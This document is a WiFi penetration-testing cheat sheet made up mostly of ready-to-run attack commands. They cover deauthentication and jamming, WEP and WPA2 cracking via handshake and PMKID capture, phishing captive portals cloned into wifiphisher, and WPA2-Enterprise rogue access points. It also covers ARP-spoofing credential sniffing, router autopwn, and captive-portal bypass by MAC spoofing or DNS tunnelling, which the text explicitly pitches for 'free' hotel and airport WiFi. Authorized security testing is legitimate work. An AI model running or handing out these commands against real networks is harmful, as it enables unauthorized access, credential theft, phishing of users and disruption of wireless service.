# WiFi Penetration Testing Guide

## Index

1. [Basic commands](#1)

2. [Open networks](#2)

	2.1. [Captive portals](#21)

	2.2. [Man in the Middle attack](#22)

3. [WEP cracking](#3)

	3.1. [No clients](#31)

4. [WPA2-PSK cracking](#4)

	4.1. [Cracking the 4-way-handshake](#41)
	
	4.2. [PMKID attack](#42)

5. [WPA2-Enterprise](#5)

	5.1. [Fake Access Points](#51)
	
	5.2. [Brute force](#52)
	
	5.3. [EAP methods supported](#53)

6. [Other attacks](#6)

	6.1. [Krack Attack](#61)

	6.2. [OSINT](#62)

	6.3. [Wifi Jamming](#63)

	6.4. [Other frameworks](#64)

7. [Post-exploitation](#7)

	7.1. [Attacking the router](#71)
	
	7.2. [Types of scanners](#72)
	
	7.3. [Spoofing](#73)

-------------------------

<br>

# <a name="1"></a>1. Basic commands


#### Set environment variable

```bash
VARIABLE=value
```

#### Check interface mode 

```bash
iwconfig $IFACE
```

#### Check interface status

```bash
ifconfig $IFACE
```

#### Set monitor mode 

```
airmon-ng check kill
ifconfig $IFACE down
iwconfig $IFACE mode monitor
ifconfig $IFACE up
```


#### List networks

1. Set monitor mode

2. Run Airodump-ng-ng

```bash
airodump-ng $IFACE -c $CHANNEL -e $ESSID
```


#### Deauthentication

1. Only one client

```bash
 aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

2. An Access Point (= all the clients in the AP)

```bash
 aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC $IFACE
```

#### Get hidden SSID

1. List networks

List the networks using Airodump-ng and get the AP's MAC address ($AP_MAC) and one from a client ($CLIENT_MAC). Do not stop the capture.

2. Deauthenticate

In another terminal, deauthenticate a client or all of them. When Airodump-ng captures a handshake from this network, the name or ESSID will appear in the first terminal:

```bash
aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

-------------------------

<br>

# <a name="2"></a>2. Open networks

## <a name="21"></a>2.1. Captive portals

### 2.1.1. Fake captive portals


1. Clone a website using [HTTrack](https://www.httrack.com/) 

2. Install [Wifiphiser](https://github.com/wifiphisher/wifiphisher). Add the HTTrack result in a new folder in *wifiphisher/data/phishing-pages/*new_page*/html* and a configuration file in  *wifiphisher/data/phishing-pages/*new_page*/config.ini*. 

3. Recompile the project using *python setup.py install* or the binary in *bin*. 

4. This command works correctly in the latest Kali release after installing hostapd:

```
cd bin && ./wifiphisher -aI $IFACE -e $ESSID --force-hostapd -p $PLUGIN -nE
```

<br>

### 2.1.2. Bypass 1: MAC spoofing

The first method to bypass a captive portal is to change your MAC address to one of an already authenticated user

1. Scan the network and get the list of IP and MAC addresses. You can use:

- nmap

- A custom script like [this](scripts/open/get_mac_ip.sh) (Bash) or [this](scripts/open/get_mac_ip.py) (Python)

2. Change your IP and MAC addresses. You can use:

- macchanger

- A custom script like [this](scripts/open/change_mac_ip.sh)(Bash)


Also, you can use scripts to automate the process like:

- [Poliva script](https://raw.githubusercontent.com/poliva/random-scripts/master/wifi/hotspot-bypass.sh)

- [Hackcaptiveportals](https://github.com/systematicat/hack-captive-portals)

<br>

### 2.1.3. Bypass 2: DNS tunnelling

A second method is creating a DNS tunnel. For this, it is necessary to have an accessible DNS server of your own. You can use this method to bypass the captive portal and get "free" Wifi in hotel, airports...


1. Check the domain names are resolved:

```
nslookup example.com
```

2. Create 2 DNS records (in [Digital ocean](https://www.digitalocean.com/), [Afraid.org](http://freedns.afraid.org/)...):

- One "A record":  dns.$DOMAIN pointing to the $SERVER_IP (Example: dns.domain.com 139.59.172.117)

- One "NS record": hack.$DOMAIN pointing to dns.$DOMAIN (Example: hack.domain.com dns.domain.com)


3. Execution in the server

```
iodined -f -c -P $PASS -n $SERVER_IP 10.0.0.1 hack.$DOMAIN
```

4. Check if it works correctly in [here](https://code.kryo.se/iodine/check-it/)


5. Execution in the client

```
iodine -f -P $PASS $DNS_SERVER_IP hack.$DOMAIN
```

6. Create the tunnel

```
ssh -D 8080 $USER@10.0.0.1
```

<br>

## <a name="22"></a>2.2. Man in the Middle attack

Once you are in the network, you can test if it is vulnerable to Man in the Middle attacks.

1. ARP Spoofing attack using [Ettercap](https://www.ettercap-project.org/)

2. Sniff the traffic using Wireshark or TCPdump

3. Analyze the traffic using [PCredz](https://github.com/lgandx/PCredz) (Linux) or [Network Miner](https://www.netresec.com/?page=networkminer) (Windows)

-------------------------

<br>

# <a name="3"></a>3. WEP cracking

1. Start capture
```bash
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```


2. Accelerate the IV capture using *Fake authentication* + *Arp Request Replay Attack* + *Deauthenticate user*. Stop Airodump at ~100.000 different IVs

```bash
aireplay-ng -1 0 -e $AP_NAME -a $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -3 -b $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
```

3. Crack the password using Aircrack-ng
```bash
aircrack-ng $PCAP_FILE
```


-------------------------


<br>

# <a name="4"></a>4. WPA2-PSK cracking

## <a name="41"></a>4.1. Cracking the 4-way-handshake

1. Start capture

```bash
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```

2. Deauthenticate an user. Stop airodump capture when you see a message 'WPA handshake: $MAC'

```bash
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
```

3. Option 1: Crack the handshake using Aircrack-ng

```bash
aircrack-ng -w $WORDLIST capture.cap
```

You can get wordlists from [here](https://github.com/kennyn510/wpa2-wordlists).

4. Option 2: Crack the handshake using Pyrit

```
pyrit -r $PCAP_FILE analyze
pyrit -r $PCAP_FILE -o $CLEAN_PCAP_FILE strip
pyrit -i $WORDLIST import_passwords
pyrit eval
pyrit batch
pyrit -r $CLEAN_PCAP_FILE attack_db
```

<br>

## <a name="42"></a>4.2. PMKID attack

You can use [this script](scripts/wpa/pmkid.sh) or follow these steps:

1. Install Hcxdumptool and Hcxtool (you can use this [script](scripts/wpa/pmkid_install.sh)).

2. Stop Network Manager

```bash
airmon-ng check kill
```


3a. If you want to attack all the networks 

```bash
TO DO
```


3b. If you want to attack a specific MAC address

- Create a text file ($FILTER_FILE) and add the MAC address without ":". You can use *sed* and redirect the output to a file:

```
echo $MAC | sed 's/://g' > $FILTER_FILE
```

- Capture PMKID

```bash
hcxdumptool -i $IFACE -o $PCAPNG_FILE --enable_status=1 --filterlist=$FILTER_FILE --filtermode=2
```

4. Create $HASH_FILE 

```bash
hcxpcaptool -z $HASH_FILE $PCAPNG_FILE
```
 
The structure of each line is: PMKID * ROUTER MAC * STATION * ESSID (check at: https://www.rapidtables.com/convert/number/hex-to-ascii.html) 

5. Crack it using Hashcat (option 16800)

```bash
hashcat -a 0 -m 16800 $HASH_FILE $WORDLIST --force
```


-------------------------

<br>

# 5. <a name="5"></a> WPA2-Enterprise

## 5.1 <a name="51"></a>Fake Access Points

### Virtual machines download

| Operative system | Platform | Credentials | Size | Link |
| ---------------- | -------- | ----------- | ---- | ---- |
| Ubuntu 16.04.5   | VMware   | ricardojoserf:wifi | 3.25 GB | [MEGA](https://mega.nz/#!5h92EQYa!LHCNzYTN3GXEYYWcXgOUsnU37PpksbcaUFRlOK7RyRM) |
| Kali 2019.1      | VMware   | root:wifi          | 4.99 GB | [MEGA](https://mega.nz/#!s90G0SBL!P4tYAfAT42Q2JVQY723KcW0XzKqEC8lbxVuJVbu7aTM) |
| Ubuntu 16.04.5   | VirtualBox | ricardojoserf:wifi | 3.18 GB | [MEGA](https://mega.nz/#!so9AzC7Q!XwAUmiSRUvldwrkNsSoyEbUTCUJDiyG3P1O_sYJNlcY) |
| Kali 2019.1      | VirtualBox | root:wifi        | 5.56 GB | [MEGA](https://mega.nz/#!FwEznIAI!mDNEhDb8lmVDhMvbl3kx3Rh99KXpCIeylNyXZcp-5gI) |

### Local installation

In case you do not want to use the virtual machine, you can install everything using:

```
git clone https://github.com/ricardojoserf/WPA_Enterprise_Attack

cd WPA_Enterprise_Attack && sudo sh install.sh
```

### Hostapd & Freeradius-wpe

Start the Access Point using:

```
sh freeradius_wpe_init.sh $AP_NAME $INTERFACE
```

When a client connects, read logs with:

```
sh freeradius_wpe_read.sh
```

### Hostapd-wpe

```
sh hostapd_wpe_init.sh $AP_NAME $INTERFACE
```



## 5.2 <a name="52"></a>Brute force

- [Airhammer](https://github.com/Wh1t3Rh1n0/air-hammer)

## 5.3 <a name="53"></a>EAP methods supported

Find supported EAP methods

- [EAP_buster](https://github.com/blackarrowsec/EAP_buster)

-------------------------

<br>

# <a name="6"></a>6. Other attacks


## <a name="61"></a>6.1. Krack Attack

- [Krack Attack Scripts](https://github.com/vanhoefm/krackattacks-scripts)


## <a name="62"></a>6.2. OSINT

- [Wigle](https://wigle.net/)



## <a name="63"></a>6.3. Wifi Jamming

- [Wifijammer](https://github.com/DanMcInerney/wifijammer) - This program can send deauthentication packets to both APs and clients. 

An example to deauthenticate all the devices except a Fake Acess Point:

```
sudo ./wifijammer -i $IFACE -s $FAKE_AP_MAC
```

## <a name="64"></a>6.4. Other frameworks

Linux:
- [Sniffair](https://github.com/Tylous/SniffAir)
- [Wifi Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin) - Framework for Rogue WiFi Access Point Attack
- [Eaphammer](https://github.com/s0lst1c3/eaphammer) - Framework for Fake Access Points

Windows:
- [Acrylic](https://www.acrylicwifi.com) - Useful for recon phase
- [Ekahau](https://www.ekahau.com/) - Useful for Wi-Fi planning
- [Vistumbler](https://www.vistumbler.net/) - Useful for wardriving




-------------------------

<br>

# <a name="7"></a>7. Post-exploitation

Once you are connected to the network

## <a name="71"></a>7.1. Attacking the router

- [Routersploit](https://github.com/threat9/routersploit) - Exploitation Framework for Embedded Devices - Test "use scanners/autopwn"

## <a name="72"></a>7.2. Types of scanners

- Nmap/Zenmap - Security Scanner, Port Scanner, & Network Exploration Tool

- Masscan - The faster version of nmap (it can break things, so be careful)

- Netdiscover - ARP sniffing. Very useful if the networks are very well segmented

## <a name="73"></a>7.3. Spoofing

- Ettercap - Check if you can do a MitM attack and sniff all the traffic in the network

